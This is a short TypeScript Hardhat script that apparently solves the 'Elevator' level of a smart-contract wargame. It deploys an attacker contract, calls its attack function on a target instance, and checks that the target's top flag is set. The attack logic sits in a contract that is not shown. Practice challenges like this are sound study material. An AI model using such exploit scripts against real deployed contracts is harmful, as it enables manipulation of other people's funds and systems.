import { ethers } from "hardhat";
import * as fs from 'fs';
import { Elevator__factory, ElevatorAttacker__factory } from '../typechain-types';
import { privateKey, rpc } from "../hardhat.config";

// Task: make top true

const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    console.log("Hacking the contract...");

    const metadata = JSON.parse(fs.readFileSync('./artifacts/contracts/attackers/ElevatorAttacker.sol/ElevatorAttacker.json').toString());
    const factory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer);
    const contract = await factory.deploy();
    await contract.deploymentTransaction()?.wait();

    const attackerAddress = await contract.getAddress();
    const attacker = ElevatorAttacker__factory.connect(attackerAddress, signer);
    const victim = Elevator__factory.connect(instanceAddress, signer);

    tx = await attacker.connect(signer).attack(instanceAddress);
    await tx.wait();

    const isTop = await victim.top();

    console.log("Successfully hacked!");
    console.log("Top:", isTop);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});